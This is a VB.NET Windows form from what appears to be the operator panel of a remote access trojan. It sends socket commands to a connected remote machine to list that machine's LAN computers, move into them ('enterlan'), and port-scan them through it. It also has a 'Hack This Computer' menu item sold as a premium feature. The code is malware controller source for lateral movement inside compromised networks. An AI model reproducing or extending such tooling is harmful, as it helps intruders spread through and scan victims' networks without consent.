Public Class Lan
    Public xSize As System.Drawing.Size
    Public i As Integer = 0
    Public jj As Integer = 0
    Public sock As Integer
    Private Sub Lan_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        ListView1.Items.Clear()
        Main.S.Send(sock, "getlan")



    End Sub

    Private Sub HackThisComputerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles HackThisComputerToolStripMenuItem.Click
        MsgBox("This Option is for permium users only")
    End Sub


    Private Sub ListView1_DoubleClick(sender As System.Object, e As System.EventArgs) Handles ListView1.DoubleClick
        Dim pcname As String = ListView1.FocusedItem.SubItems.Item(0).Text
        Main.S.Send(sock, "enterlan" & Main.Yy & pcname)
    End Sub

    Private Sub OpenPortScannerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenPortScannerToolStripMenuItem.Click
        ListView2.Items.Clear()
        i = 0
        Dim port1 = InputBox("Enter Start Port")
        Dim port2 = InputBox("Enter Start Port")
        Dim pcname As String = ListView1.FocusedItem.SubItems.Item(0).Text
        Main.S.Send(sock, "scanlan" & Main.Yy & pcname & Main.Yy & port1 & Main.Yy & port2)
    End Sub
    Sub Doublekiller()
        Dim networkssid As New List(Of ListViewItem) ' 
        For Each ssid1 As ListViewItem In ListView1.Items ' 
            Dim networkfind As Boolean = False
            For Each ssid2 As ListViewItem In networkssid
                If ssid1.Text = ssid2.Text Then networkfind = True
            Next
            If networkfind = False Then networkssid.Add(ssid1)
        Next
        ListView1.Items.Clear()
        For Each ssid As ListViewItem In networkssid
            ListView1.Items.Add(ssid)
        Next
    End Sub


    '  Public Sub Armitage_Grapichs(ByVal pt1 As PointF, ByVal pt2 As PointF)


    ' Dim g As Graphics = ListView1.CreateGraphics
    ' Dim pen1 As New Pen(Brushes.Lime, 10)
    ' g.DrawImage(pen1, CInt(longcord) - 1, CInt(latcord) - 1, 18, 16)
    ' g.DrawLine(pen1, CInt(longcord) - 1, CInt(latcord) - 1, 3, 3)

    'g.DrawLine(pen1, pt1, pt2)
    '  g.dr()
    ' g.DrawString("===========>", System.Drawing.Font, pen1.Brush, pt1)
    ' End Sub

    Private Sub RefreshLansToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshLansToolStripMenuItem.Click
        ListView1.Items.Clear()
        Main.S.Send(sock, "getlan")

    End Sub
End Class